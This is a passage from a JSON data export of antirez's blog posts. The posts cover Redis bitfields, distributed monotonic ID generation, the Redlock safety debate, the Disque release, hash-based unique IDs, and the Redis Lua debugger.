of the Redis community.  The command will be backported into the stable version of Redis in the next weeks, so this will be usable very soon.  Curious about the implementation? It's more complex you could expect probably: https://github.com/antirez/redis/commit/70af626d613ebd88123f87a941b0dd3570f9e7d2 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-02-26T15:02:54Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7166.3226078, "slug": "100-more-of-those-bitfields-37", "topics": []}}, {"model": "app.post", "pk": 38, "fields": {"title": "The binary search of distributed programming", "link": "http://antirez.com/news/102", "source": 1, "normalized_link": "antirez.com/news/102", "summary": "Yesterday night I was re-reading Redlock analysis Martin Kleppmann wrote (http://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html). At some point Martin wonders if there is some good way to generate monotonically increasing IDs with Redis.  This apparently simple problem can be more complex than it looks at a first glance, considering that it must ensure that, in all the conditions, there is a safety property which is always guaranteed: the ID generated is always greater than all the past IDs generated, and the same ID cannot be generated multiple times. This must hold during network partitions and other failures. The system may just become unavailable if there are less than the majority of nodes that can be reached, but never provide the wrong answer (note: as we'll see this algorithm has another liveness issue that happens during high load of requests).  So for the sake of playing a bit more with distributed systems algorithms, and learn a bit more in the process, I tried to find a solution. Actually I was aware of an algorithm that could solve the problem. It\u2019s an inefficient one, not suitable to generate tons of IDs per second. Many complex distributed algorithms, like Raft and Paxos, use it as a step in order to get monotonically increasing IDs, as a foundation to mount the full set of properties they need to provide. This algorithm is fascinating since it\u2019s extremely easy to understand and implement, and because it\u2019s very intuitive to understand *why* it works. I could say, it is the binary search of distributed algorithms, something easy enough but smart enough to let newcomers to distributed programming to have an ah!-moment.  However I had to modify the algorithm in order to adapt it to be implemented in the client side. Hopefully it is still correct (feedbacks appreciated). While I\u2019m not going to use this algorithm in order to improve Redlock (see my previous blog post), I think that trying to solve this kind of problems is both a good exercise, and it may be an interesting read for people approaching distributed systems for the first times looking for simple problems to play with in real world systems.  ## How it works?  The algorithm requirements are the following two:  1. A data store that supports the operation set_if_less_than().  2. A data store that can fsync() data to disk on writes, before replying to the client.  The above includes almost any *SQL server, Redis, and a number of other stores.  We have a set of N nodes, let\u2019s assume N = 5 for simplicity in order to explain the algorithm. We initialize the system by setting a key called \u201ccurrent\u201d to the value of 0, so in Redis terms, we do:      SET current 0  In all the 5 instances. This is part of the initialization and must be done only when a new \u201ccluster\u201d is initialized. This step can be skipped but makes the explanation simpler.  In order to generate a new ID, this is what we do:  1: Get the \u201ccurrent\u201d value from the majority of instances (3 or more if N=5).  2: If we failed to reach 3 instances, GOTO 1.  3: Get the maximum value among the ones we obtained, and increment it by 1. Let\u2019s call this $NEXTID  4: Send the following write operation to all the nodes we are able to reach.      IF current < $NEXTID THEN         SET current $NEXTID         return $NEXTID     ELSE         return NULL     END  5: If 3 or more instances will reply $NEXTID, the algorithm succeeded, and we successfully generated a new monotonically increasing ID.  6: Otherwise, if we have not reached the majority, GOTO 1.  What we send at step 4 can be easily translated to a simple Redis Lua script:      local val = tonumber(redis.call('get',KEYS[1]))     local nextid = tonumber(ARGV[1])      if val < nextid then         redis.call('set',KEYS[1],nextid)         return nextid     else         return nil     end  ## Is it safe?  The reason why I intuitively believe that it works, other than the fact that, in a modified form is used as a step in deeply analyzed algorithms, is that:  If we are able to obtain the majority of \u201cvotes\u201d, it is impossible by definition that any other client obtained the majority for an ID greater or equal to the one we generated. Otherwise there were already 3 or more instances with a value of current >= $NEXTID, and it would be impossible for us to get the majority. So the IDs generated are always greater than the past IDs, and for the same condition it is impossible for two instances to generate the same ID.  Maybe some kind reader could point to a bug in the algorithm or to an analysis of this algorithm as used in other analyzed systems, however given that the above is adapted to be executed client-side, there are actually more processes involved and it should be re-analyzed in order to provide a proof that it is equivalent.  ## Why it\u2019s a slow algorithm?  The problem with this algorithm is concurrent accesses. If many clients are trying to generate new IDs at the same time, nobody may get the majority, and they will need to retry again, with larger numbers. Note that this also means that there could be \u201choles\u201d in the sequence of generated IDs, so the clients could be able to generate the sequence 1, 2, 6, 10, 11, 21, \u2026 Because many numbers could be \u201cburn\u201d by the split brain condition caused by concurrent access.  (Note that in the above sentence \"split brain\" does not mean that there is an inconsistent state between the nodes, just that it was not possible to reach the majority to agree about a given ID. Usually split brain refers to a conflict in the configuration where, for example, multiple nodes claim to be a master. However in the Raft paper the term split brain is used with the same meaning I'm using here).  How many IDs per second you can generate without incurring frequent failures due to concurrent accesses depends on the network RTT and number of concurrent clients. What\u2019s interesting however is that you can make the algorithm more scalable by creating an \u201cIDs server\u201d that talks to the cluster, and mediates the access of the clients by serializing the generation of the new IDs one after the other. This does not create a single point of failure since you don\u2019t need to have a single ID server, you can run a few for redundancy, and have hundreds of clients connecting to it.  Using this schema to generate 5k IDs/sec, should be viable, especially if the client is implemented in a smart way, trying to send the requests to the 5 nodes at the same time, using some multiplexing or threaded approach.  Another approach when there are many clients and no node mediating the access is to use randomized and exponential delays to contact the nodes again, if a round of the algorithm failed.  ## Why fsync is needed?  Here fsync at every write is mandatory because if nodes go down and restart, they MUST have the latest value of the \u201ccurrent\u201d key. If the value of current returns backward, it is possible to violate our safety property that states that the newly generated IDs are always greater than any other ID generated in the past. However if you use a full replicated FSM to achieve the same goal, you need fsync anyway (but you don\u2019t have the problem of the concurrent accesses. For example using Raft in normal conditions you have a single leader you can send requests to).  So, in the case of Redis, it must be configured with AOF enabled and the AOF fsync policy set to always, to make sure the write is always persisted before to reply to the client.  ## What do I do with those IDs  A set of IDs like that, have a property which is called \u201ctotal ordering\u201d, so they are very useful in different contexts. Usually it is hard with distributed computations to say what happened before and what happened after. Using those IDs you always know the order of certain events.  To give you a simple example: different processes, using this system, may compute a list of items, and take each sub-list in their local storage. At the end, they could merge the multiple lists and get a final list in the right order, as if there was a single shared list since the start where each process was able to append an item.  ## Origins of this algorithm  What described here closely resembles both Paxos first phase and Raft leader election. However it seems just a special case of Lamport timestamp where the majority is used in order to create total ordering.  Many thanks to Max Neunhoeffer and Martin Kleppmann for feedbacks about the initial draft of this blog post. Note that any error is mine. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-02-13T16:49:13Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7141.5043633, "slug": "the-binary-search-of-distributed-programming-38", "topics": []}}, {"model": "app.post", "pk": 39, "fields": {"title": "Is Redlock safe?", "link": "http://antirez.com/news/101", "source": 1, "normalized_link": "antirez.com/news/101", "summary": "Martin Kleppmann, a distributed systems researcher, yesterday published an analysis of Redlock (http://redis.io/topics/distlock), that you can find here: http://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html  Redlock is a client side distributed locking algorithm I designed to be used with Redis, but the algorithm orchestrates, client side, a set of nodes that implement a data store with certain capabilities, in order to create a multi-master fault tolerant, and hopefully safe, distributed lock with auto release capabilities. You can implement Redlock using MySQL instead of Redis, for example.  The algorithm's goal was to move away people that were using a single Redis instance, or a master-slave setup with failover, in order to implement distributed locks, to something much more reliable and safe, but having a very low complexity and good performance.  Since I published Redlock people implemented it in multiple languages and used it for different purposes.  Martin's analysis of the algorithm concludes that Redlock is not safe. It is great that Martin published an analysis, I asked for an analysis in the original Redlock specification here: http://redis.io/topics/distlock. So thank you Martin. However I don\u2019t agree with the analysis. The good thing is that distributed systems are, unlike other fields of programming, pretty mathematically exact, or they are not, so a given set of properties can be guaranteed by an algorithm or the algorithm may fail to guarantee them under certain assumptions. In this analysis I\u2019ll analyze Martin's analysis so that other experts in the field can check the two documents (the analysis and the counter-analysis), and eventually we can understand if Redlock can be considered safe or not.  Why Martin thinks Redlock is unsafe -----------------------------------  The arguments in the analysis are mainly two:  1. Distributed locks with an auto-release feature (the mutually exclusive lock property is only valid for a fixed amount of time after the lock is acquired) require a way to avoid issues when clients use a lock after the expire time, violating the mutual exclusion while accessing a shared resource. Martin says that Redlock does not have such a mechanism.  2. Martin says the algorithm is, regardless of problem \u201c1\u201d, inherently unsafe since it makes assumptions about the system model that cannot be guaranteed in practical systems.  I\u2019ll address the two concerns separately for clarity, starting with the first \u201c1\u201d.  Distributed locks, auto release, and tokens -------------------------------------------  A distributed lock without an auto release mechanism, where the lock owner will hold it indefinitely, is basically useless. If the client holding the lock crashes and does not recover with full state in a short amount of time, a deadlock is created where the shared resource that the distributed lock tried to protect remains forever unaccessible. This creates a liveness issue that is unacceptable in most situations, so a sane distributed lock must be able to auto release itself.  So practical locks are provided to clients with a maximum time to live. After the expire time, the mutual exclusion guarantee, which is the *main* property of the lock, is gone: another client may already have the lock. What happens if two clients acquire the lock at two different times, but the first one is so slow, because of GC pauses or other scheduling issues, that will try to do work in the context of the shared resource at the same time with second client that acquired the lock?  Martin says that this problem is avoided by having the distributed lock server to provide, with every lock, a token, which is, in his example, just a number that is guaranteed to always increment. The rationale for Martin's usage of a token, is that this way, when two different clients access the locked resource at the same time, we can use the token in the database write transaction (that is assumed to materialize the work the client does): only the client with the greatest lock number will be able to write to the database.  In Martin's words:  \u201cThe fix for this problem is actually pretty simple: you need to include a fencing token with every write request to the storage service. In this context, a fencing token is simply a number that increases (e.g. incremented by the lock service) every time a client acquires the lock\u201d  \u2026 snip \u2026  \u201cNote this requires the storage server to take an active role in checking tokens, and rejecting any writes on which the token has gone backwards\u201d.  I think this argument has a number of issues:  1. Most of the times when you need a distributed lock system that can guarantee mutual exclusivity, when this property is violated you already lost. Distributed locks are very useful exactly when we have no other control in the shared resource. In his analysis, Martin assumes that you always have some other way to avoid race conditions when the mutual exclusivity of the lock is violated. I think this is a very strange way to reason about distributed locks with strong guarantees, it is not clear why you would use a lock with strong properties at all if you can resolve races in a different way. Yet I\u2019ll continue with the other points below just for the sake of showing that Redlock can work well in this, very artificial, context.  2. If your data store can always accept the write only if your token is greater than all the past tokens, than it\u2019s a linearizable store. If you have a linearizable store, you can just generate an incremental ID for each Redlock acquired, so this would make Redlock equivalent to another distributed lock system that provides an incremental token ID with every new lock. However in the next point I\u2019ll show how this is not needed.  3. However \u201c2\u201d is not a sensible choice anyway: most of the times the result of working to a shared resource is not writing to a linearizable store, so what to do? Each Redlock is associated with a large random token (which is generated in a way that collisions can be ignored. The Redlock specification assumes textually \u201c20 bytes from /dev/urandom\u201d). What do you do with a unique token? For example you can implement Check and Set. When starting to work with a shared resource, we set its state to \u201c``\u201d, then we operate the read-modify-write only if the token is still the same when we write.  4. Note that in certain use cases, one could say, it\u2019s useful anyway to have ordered tokens. While it\u2019s hard to think at an use case, note that for the same GC pauses Martin mentions, the order in which the token was acquired, does not necessarily respects the order in which the clients will attempt to work on the shared resource, so the lock order may not be casually related to the effects of working to a shared resource.  5. Most of the times, locks are used to access resources that are updated in a way that is non transactional. Sometimes we use distributed locks to move physical objects, for example. Or to interact with another external API, and so forth.  I want to mention again that, what is strange about all this, is that it is assumed that you always must have a way to handle the fact that mutual exclusion is violated. Actually if you have such a system to avoid problems during race conditions, you probably don\u2019t need a distributed lock at all, or at least you don\u2019t need a lock with strong guarantees, but just a weak lock to avoid, most of the times, concurrent accesses for performances reasons.  However even if you happen to agree with Martin about the fact the above is very useful, the bottom line is that a unique identifier for each lock can be used for the same goals, but is much more practical in terms of not requiring strong guarantees from the store.  Let\u2019s talk about system models ------------------------------  The above criticism is basically common to everything which is a distributed lock with auto release, not providing a monotonically increasing counter with each lock. However the other critique of Martin is specific to Redlock. Here Martin really analyzes the algorithm, concluding it is broken.  Redlock assumes a semi synchronous system model where different processes can count time at more or less the same \u201cspeed\u201d. The different processes don\u2019t need in any way to have a bound error in the absolute time. What they need to do is just, for example, to be able to count 5 seconds with a maximum of 10% error. So one counts actual 4.5 seconds, another 5.5 seconds, and we are fine.  Martin also states that Redlock requires bound messages maximum delays, which is not correct as far as I can tell (I\u2019ll explain later what\u2019s the problem with his reasoning).  So let\u2019s start with the issue of different processes being unable to count time at the same rate.  Martin says that the clock can randomly jump in a system because of two issues:  1. The system administrator manually alters the clock.  2. The ntpd daemon changes the clock a lot because it receives an update.  The above two problems can be avoided by \u201c1\u201d not doing this (otherwise even corrupting a Raft log with \u201cecho foo > /my/raft/log.bin\u201d is a problem), and \u201c2\u201d using an ntpd that does not change the time by jumping directly, but by distributing the change over the course of a larger time span.  However I think Martin is right that Redis and Redlock implementations should switch to the monotonic time API provided by most operating systems in order to make the above issues less of a problem. This was proposed several times in the past, adds a bit of complexity inside Redis, but is a good idea: I\u2019ll implement this in the next weeks. However while we\u2019ll switch to monotonic time API, because there are advantages, processes running in an operating system without a software (time server) or human (system administrator) elements altering the clock, *can* count relative time with a bound error even with gettimeofday().  Note that there are past attempts to implement distributed systems even assuming a bound absolute time error (by using GPS units). Redlock does not require anything like that, just the ability of different processes to count 10 seconds as 9.5 or 11.2 (+/- 2 seconds max in the example), for instance.  So is Redlock safe or not? It depends on the above. Let\u2019s assume we use the monotonically increasing time API, for the sake of simplicity to rule out implementation details (system administrators with a love for POKE and time servers). Can a process count relative time with a fixed percentage of maximum error? I think this is a sounding YES, and is simpler to reply yes to this than to: \u201ccan a process write a log without corrupting it\u201d?  Network delays & co -------------------  Martin says that Redlock does not just depend on the fact that processes can count time at approximately the same time, he says:  \u201cHowever, Redlock is not like this. Its safety depends on a lot of timing assumptions: it assumes that all Redis nodes hold keys for approximately the right length of time before expiring; that that the network delay is small compared to the expiry duration; and that process pauses are much shorter than the expiry duration.\u201d  So let\u2019s split the above claims into different parts:  1. Redis nodes hold keys for approximately the right length of time.  2. Network delays are small compared to the expiry duration.  3. Process pauses are much shorter than the expiry duration.  All the time Martin says that \u201cthe system clock jumps\u201d I assume that we covered this by not poking with the system time in a way that is a problem for the algorithm, or for the sake of simplicity by using the monotonic time API. So:  About claim 1: This is not an issue, we assumed that we can count time approximately at the same speed, unless there is any actual argument against it.  About claim 2: Things are a bit more complex. Martin says:  \u201cOkay, so maybe you think that a clock jump is unrealistic, because you\u2019re very confident in having correctly configured NTP to only ever slew the clock.\u201d (Yep we agree here ;-) he continues and says\u2026)  \u201cIn that case, let\u2019s look at an example of how a process pause may cause the algorithm to fail: Client 1 requests lock on nodes A, B, C, D, E. While the responses to client 1 are in flight, client 1 goes into stop-the-world GC. Locks expire on all Redis nodes. Client 2 acquires lock on nodes A, B, C, D, E. Client 1 finishes GC, and receives the responses from Redis nodes indicating that it successfully acquired the lock (they were held in client 1\u2019s kernel network buffers while the process was paused). Clients 1 and 2 now both believe they hold the lock.\u201d  If you read the Redlock specification, that I hadn't touched for months, you can see the steps to acquire the lock are:  1. Get the current time.  2. \u2026 All the steps needed to acquire the lock \u2026  3. Get the current time, again.  4. Check if we are already out of time, or if we acquired the lock fast enough.  5. Do some work with your lock.  Note steps 1 and 3. Whatever delay happens in the network or in the processes involved, after acquiring the majority we *check again* that we are not out of time. The delay can only happen after steps 3, resulting into the lock to be considered ok while actually expired, that is, we are back at the first problem Martin identified of distributed locks where the client fails to stop working to the shared resource before the lock validity expires. Let me tell again how this problem is common with *all the distributed locks implementations*, and how the token as a solution is both unrealistic and can be used with Redlock as well.  Note that whatever happens between 1 and 3, you can add the network delays you want, the lock will always be considered not valid if too much time elapsed, so Redlock looks completely immune from messages that have unbound delays between processes. It was designed with this goal in mind, and I cannot see how the above race condition could happen.  Yet Martin's blog post was also reviewed by multiple DS experts, so I\u2019m not sure if I\u2019m missing something here or simply the way Redlock works was overlooked simultaneously by many. I\u2019ll be happy to receive some clarification about this.  The above also addresses \u201cprocess pauses\u201d concern number 3. Pauses during the process of acquiring the lock don\u2019t have effects on the algorithm's correctness. They can however, affect the ability of a client to make work within the specified lock time to live, as with any other distributed lock with auto release, as already covered above.  Digression about network delays ---  Just a quick note. In server-side implementations of a distributed lock with auto-release, the client may ask to acquire a lock, the server may allow the client to do so, but the process can stop into a GC pause or the network may be slow or whatever, so the client may receive the \"OK, the lock is your\" too late, when the lock is already expired. However you can do a lot to avoid your process sleeping for a long time, and you can't do much to avoid network delays, so the steps to check the time before/after the lock is acquired, to see how much time is left, should actually be common practice even when using other systems implementing locks with an expiry.  Fsync or not? -------------  At some point Martin talks about the fact that Redlock uses delayed restarts of nodes. This requires, again, the ability to be able to wait more or less a specified amount of time, as covered above. Useless to repeat the same things again.  However what is important about this is that, this step is optional. You could configure each Redis node to fsync at every operation, so that when the client receives the reply, it knows the lock was already persisted on disk. This is how most other systems providing strong guarantees work. The very interesting thing about Redlock is that you can opt-out any disk involvement at all by implementing delayed restarts. This means it\u2019s possible to process hundreds of thousands locks per second with a few Redis instances, which is something impossible to obtain with other systems.  GPS units versus the local computer clock -----------------------------------------  Returning to the system model, one thing that makes Redlock system model practical is that you can assume a process to never be partitioned with the system clock. Note that this is different compared to other semi synchronous models where GPS units are used, because there are two non obvious partitions that may happen in this case:  1. The GPS is partitioned away from the GPS network, so it can\u2019t acquire a fix.  2. The process and the GPS are not able to exchange messages or there are delays in the messages exchanged.  The above problems may result into a liveness or safety violation depending on how the system is orchestrated (safety issues only happen if there is a design error, for example if the GPS updates the system time asynchronously so that, when the GPS does not work, the absolute time error may go over the maximum bound).  The Redlock system model does not have these complexities nor requires additional hardware, just the computer clock, and even a very cheap clock with all the obvious biases due to the crystal temperature and other things influencing the precision.  Conclusions -----------  I think Martin has a point about the monotonic API, Redis and Redlock implementations should use it to avoid issues due to the system clock being altered. However I can\u2019t identify other points of the analysis affecting Redlock safety, as explained above, nor do I find his final conclusions that people should not use Redlock when the mutual exclusion guarantee is needed, justified.  It would be great to both receive more feedbacks from experts and to test the algorithm with Jepsen, or similar tools, to accumulate more data.  A big thank you to the friends of mine that helped me to review this post. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-02-09T15:33:51Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7133.7238744, "slug": "is-redlock-safe-39", "topics": []}}, {"model": "app.post", "pk": 40, "fields": {"title": "Disque 1.0 RC1 is out!", "link": "http://antirez.com/news/100", "source": 1, "normalized_link": "antirez.com/news/100", "summary": "Today I\u2019m happy to announce that the first release candidate for Disque 1.0 is available.  If you don't know what Disque is, the best starting point is to read the README in the Github project page at http://github.com/antirez/disque.  Disque is a just piece of software, so it has a material value which can be zero or more, depending on its ability to make useful things for people using it. But for me there is an huge value that goes over what Disque, materially, is. It is the value of designing and doing something you care about. It\u2019s the magic of programming: where there was nothing, now there is something that works, that other people may potentially analyze, run, use.  Distributed systems are a beautiful field. Thanks to Redis, and to the people that tried to mentor me in a way or the other, I got exposed to distributed systems. I wanted to translate this love to something tangible. A new, small system, designed from scratch, without prejudices and without looking too closely to what other similar systems were doing. The experience with Redis shown me that message brokers were a very interesting topic, and that in some way, they are the perfect topic to apply DS concepts. I even pretend message brokers can be fun and exciting. So I tried to design a new message queue, and Disque is the result.  Disque design goal is to provide a system with a good user experience: to provide certain guarantees in the context of messaging, guarantees which are easy to reason about, and to provide extreme operational simplicity. The RC1 offers the foundation, but there is more work to do. For once I hope that Disque will be tested by Aphyr with Jepsen in depth. Since Disque is a system that provides certain kinds of guarantees that can be tested, if it fails certain tests, this translates directly to some bug to fix, that means to end with a better system.  On the operational side there is to test it in the real world. AP and message queues IMHO are a perfect match to provide operational robustness. However I\u2019m not living into the illusion that I got everything right in the first release, so it will take months (or years?) of iteration to *really* reach the operational simplicity I\u2019m targeting. Moreover this is an RC1 that was heavily modified in the latest weeks, I expect it to have a non trivial amount of bugs.  From the point of view of making a fun and exciting system, I tried to end with a simple and small API that does not force the user to think at the details of *this specific* implementation, but more generally at the messaging problem she or he got. Disque also has a set of introspection capabilities that should help making it a non-opaque system that is actually possible to debug and observe.  Even with all the limits of new code and ideas, the RC release is a great first step, and I\u2019m glad Disque is not in the list of side projects that we programmers start and never complete.  I was not alone during the past months, while hacking with Disque and trying to figure out how to shape it, I received the help of: He Sun, Damian Janowski, Josiah Carlson, Michel Martens, Jacques Chester, Kyle Kingsbury, Mark Paluch, Philipp Krenn, Justin Case, Nathan Fritz, Marcos Nils, Jasper Louis Andersen, Vojtech Vitek, Renato C., Sebastian Waisbrot, Redis Labs and Pivotal, and probably more people I\u2019m not remembering right now. Thank you for your help.  The RC1 is tagged in the Disque Github repository. Have fun! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-01-02T15:26:07Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7060.7535633, "slug": "disque-10-rc1-is-out-40", "topics": []}}, {"model": "app.post", "pk": 41, "fields": {"title": "Generating unique IDs: an easy and reliable way", "link": "http://antirez.com/news/99", "source": 1, "normalized_link": "antirez.com/news/99", "summary": "Two days ago Mike Malone published an interesting post on Medium about the V8 implementation of Math.random(), and how weak is the quality of the PRNG used: http://bit.ly/1SPDraN.  The post was one of the top news on Hacker News today. It\u2019s pretty clear and informative from the point of view of how Math.random() is broken and how should be fixed, so I\u2019ve nothing to add to the matter itself. But since the author discovered the weakness of the PRNG in the context of generating large probably-non-colliding IDs, I want to share with you an alternative that I used multiple times in the past, which is fast and extremely reliable.  The problem of unique IDs - - -  So, in theory, if you want to generate unique IDs you need to store some state that makes sure an ID is never repeated. In the trivial case you may use just a simple counter. However the previous ID generated must be stored in a consistent way. In case of restart of the system, it should never happen that the same ID is generated again because our stored counter was not correctly persisted on disk.  If we want to generate unique IDs using multiple processes, each process needs to make sure to prepend its IDs with some process-specific prefix that will never collide with another process prefix. This can be complex to manage as well. The simple fact of having to store in a reliable way the old ID is very time consuming when we want to generate an high number of IDs per second.  Fortunately there is a simple solution. Generate a random number in a range between 0 and N, with N so big that the probability of collisions is so small to be, for every practical application, irrelevant. This works if the number we generate is uniformly distributed between 0 and N. If this prerequisite is true we can use the birthday paradox in order to calculate the probability of collisions.  By using enough bits it\u2019s trivial to make the probability of a collision billions of times less likely than an asteroid centering the Earth, even if we generate millions of IDs per second for hundreds of years. If this is not enough margin for you, just add more bits, you can easily reach an ID space larger than the number of atoms in the universe.  This generation method has a great advantage: it is completely stateless. Multiple nodes can generate IDs at the same time without exchanging messages. Moreover there is nothing to store on disk so we can go as fast as our CPU can go. The computation will easily fit the CPU cache. So it\u2019s terribly fast and convenient.  Mike Malone was using this idea, by using the PRNG in order to create an ID composed of a set of characters, where each character was one of 64 possible characters. In order to create each character the weak V8 PRNG was used, resulting into collisions. Remember that our initial assumption is that each new ID must be selected uniformly in the space between 0 and N.  You can fix this problem by using a stronger PRNG, but this requires an analysis of the PRNG. Another problem is seeding, how do you start the process again after a restart in order to make sure you don\u2019t pick the initial state of the PRNG again? Otherwise your real ID space is limited by the seeding of the PRNG, not the output space itself.  For all the above reasons I want to show you a trivial technique that avoids most of these problems.  Using a crypto hash function to generate unique IDs - - -  Cryptographic hash functions are non invertible functions that transform a sequence of bits into a fixed sequence of bits. They are designed in order to resist a variety of attacks, however in this application we only rely on a given characteristic they have: uniformity of output. Changing a bit in the input of the hash function will result in each bit of the output to change with a 50% probability.  In order to have a reliable seed, we use some help from the operating system, by querying /dev/urandom. Seeding the generator is a moment where we really want some external entropy, otherwise we really risk of doing some huge mistake and generating the same sequence again.  As an example of crypto hash function we'll use the well known SHA1, that has an output of 160 bits. Note that you could use even MD5 sum for this application: the vulnerabilities it has have no impact in our usage here.  We start creating a seed, by reading 160 bits from /dev/urandom. In pseudocode it will be something like:      seed = devurandom.read(160/8)  We also initialize a counter:      counter = 0  Now this is the function that will generate every new ID:      function get_new_id()         myid = SHA1(string(counter) + seed)         counter = counter + 1         return myid     end  Basically we have a fixed string, which is our seed, and we hash it with a progressive counter, so if our seed is \u201cfoo\u201d, we output new IDs as:      SHA1(\u201c0foo\u201d)     SHA1(\u201c1foo\u201d)     SHA1(\u201c2foo\u201d)  This is already good for our use case. However we may also need that our IDs are not easy to predict. In order to make the IDs very hard to predict instead of using SHA1 in the get_new_id() function, just use SHA1_HMAC() instead, where the seed is the secret, and the counter the message of the HMAC.  This method is fast, has guaranteed good distribution, so collisions will be as hard as predicted by the birthday paradox, there is no analysis needed on the PRNG, and is completely stateless.  I use it on my Disque project in order to generate message IDs among multiple nodes in a distributed system.  Hacker News thread here: https://news.ycombinator.com/item?id=10606910 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-11-21T14:47:01Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6980.06143, "slug": "generating-unique-ids-an-easy-and-reliable-way-41", "topics": []}}, {"model": "app.post", "pk": 42, "fields": {"title": "6 years of commit visualized", "link": "http://antirez.com/news/98", "source": 1, "normalized_link": "antirez.com/news/98", "summary": "Today I was curious about plotting all the Redis commits we have on Git, which are 90% of all the Redis commits. There was just an initial period where I used SVN but switched very soon.  Full size image here: http://antirez.com/misc/commitsvis.png  !~!  Each commit is a rectangle. The height is the number of affected lines (a logarithmic scale is used). The gray labels show release tags.  There are little surprises since the amount of commit remained pretty much the same over the time, however now that we no longer backport features back into 3.0 and future releases, the rate at which new patchlevel versions are released diminished.  Major releases look more or less evenly spaced between 2.6, 2.8 and 3.0, but were more frequent initially, something that should change soon as we are trying to switch to time-driven releases with 3 new major release each year (that obviously will contain less new things compared to the amount of stuff was present in major releases that took one whole year). For example 3.2 RC is due for December 2015.  Patch releases of a given major release tend to have a logarithmic curve shape. As a release mature, in general it gets less critical bugs. Also attention shifts progressively to the new release.  I would love Github to give us stuff like that and much more. There is a lot of data in commits of a project that is there for years. This data should be analyzed and explored... it's a shame that the graphics section is apparently the same thing for years.  EDIT: The Tcl script used to generate this graph is here: https://github.com/antirez/redis/tree/unstable/utils/graphs/commits-over-time Comments", "content": "", "cover_photo_url": "http://antirez.com/misc/commitsvis.png", "profile": 4, "updated_on": "2015-11-20T10:58:34Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6977.83683, "slug": "6-years-of-commit-visualized-42", "topics": []}}, {"model": "app.post", "pk": 43, "fields": {"title": "Recent improvements to Redis Lua scripting", "link": "http://antirez.com/news/97", "source": 1, "normalized_link": "antirez.com/news/97", "summary": "Lua scripting is probably the most successful Redis feature, among the ones introduced when Redis was already pretty popular: no surprise that a few of the things users really want are about scripting. The following two features were suggested multiple times over the last two years, and many people tried to focus my attention into one or the other during the Redis developers meeting, a few weeks ago.  1. A proper debugger for Redis Lua scripts. 2. Replication, and storage on the AOF, of Lua scripts as a set of write commands materializing the *effects* of the script, instead of replicating the script itself as we normally do.  The second feature is not just a matter of how scripts are replicated, but also touches what you can do with Lua scripting as we will see later.  Back from London, I implemented both the features. This blog post describes both, giving a few hints about the design and implementation aspects that may be interesting for the readers.  A proper Lua debugger ---  Lua scripting was initially conceived in order to write really trivial scripts. Things like: if the key exists do this. A couple of lines in order to avoid bloating Redis with all the possible variations of commands. Of course users did a lot more with it, and started to write complex scripts: from quad-tree implementations to full featured messaging systems with non trivial semantics. Lua scripting makes Redis programmable, and usually programmers can\u2019t resist to programmable things. It helps that all the Lua scripts run using the same interpreter and are cached, so they are very fast. It is most of the time possible to do a lot more with a Redis instance by using Lua scripting, both functionally and in terms of operations per second. So complex scripts totally have their place today. We went from a very cold reception of the scripting feature (something as dynamic as a script sent to a database!), to mass usage, to writing complex scripts in a matter of a few years.  However writing simple scripts and writing complex scripts is a completely different matter. Bigger programs become exponentially more complex, and you can feel this even when going from 10 to 200 lines of code. While you can debug by brute force any simple script, just trying a few variants and observing the effects on the data set, or putting a few logging instructions in the middle, with complex scripts you have a bad time without a debugger.  My colleague Itamar Haber used a lot of his time to write complex scripts recently. At some point he also wrote some kind of debugger for Redis Lua scripting using the Lua debug library. This debugger no longer works since the debug library is now no longer exposed to scripts, for sandboxing concerns, and in general, what you want in a Redis debugger is an interactive and remote debugger, with a proper client able to work alongside with the server, to provide a good debugging experience. Debugging is already a lot of hard work, to have solid tools is really a must. The only way to accomplish this result, was to add proper debugging support inside Redis itself.  So back from London Itamar and I started to talk about what a debugger should export to the user in order to be kinda of useful, and a real upgrade compared to the past. It was also discussed to just add support for the Lua debuggers that already exist outside the Redis ecosystem. However I strongly believe the user experience is enhanced when everything is designed specifically to work well with Redis, so in the end I decided to wrote the debugger from scratch. A few things were sure: we needed a remote debugger where you could attach to Redis, start a debugging session, have good observability of what the script was doing with the Redis dataset. A special concern of mine was to have colorized output, of course ;-) I wanted to make debugging a fun experience, and to have a very fast learning curve, which are related.  Now to show how a debugger work, by writing a blog post about it, is surely possible but, even a purist like me writing articles in courier, will resort to a video from time to time. So here is longish video showing the main features of the Redis debugger. I start talking like a bit depressed since this was early in the morning, but after a few minutes coffee fires in and you\u2019ll se me more happy.  (Hint: watch the video in full screen to have acceptable font size for the interactive session. Video is high quality enough to make them readable)  !~!  If you are not into playing videos, a short recap of what you can do with the Lua debugger is provided by the debugger help screen itself:  $ ./redis-cli --ldb --eval /tmp/script.lua Lua debugging session started, please use: quit    -- End the session. restart -- Restart the script in debug mode again. help    -- Show Lua script debugging commands.  * Stopped at 1, stop reason = step over -> 1   local src = KEYS[1] lua debugger> help Redis Lua debugger help: [h]elp               Show this help. [s]tep               Run current line and stop again. [n]ext               Alias for step. [c]continue          Run till next breakpoint. [l]list              List source code around current line. [l]list [line]       List source code around [line].                      line = 0 means: current position. [l]list [line] [ctx] In this form [ctx] specifies how many lines                      to show before/after [line]. [w]hole              List all source code. Alias for 'list 1 1000000'. [p]rint              Show all the local variables. [p]rint         Show the value of the specified variable.                      Can also show global vars KEYS and ARGV. [b]reak              Show all breakpoints. [b]reak        Add a breakpoint to the specified line. [b]reak -      Remove breakpoint from the specified line. [b]reak 0            Remove all breakpoints. [t]race              Show a backtrace. [e]eval        Execute some Lua code (in a different callframe). [r]edis         Execute a Redis command. [m]axlen [len]       Trim logged Redis replies and 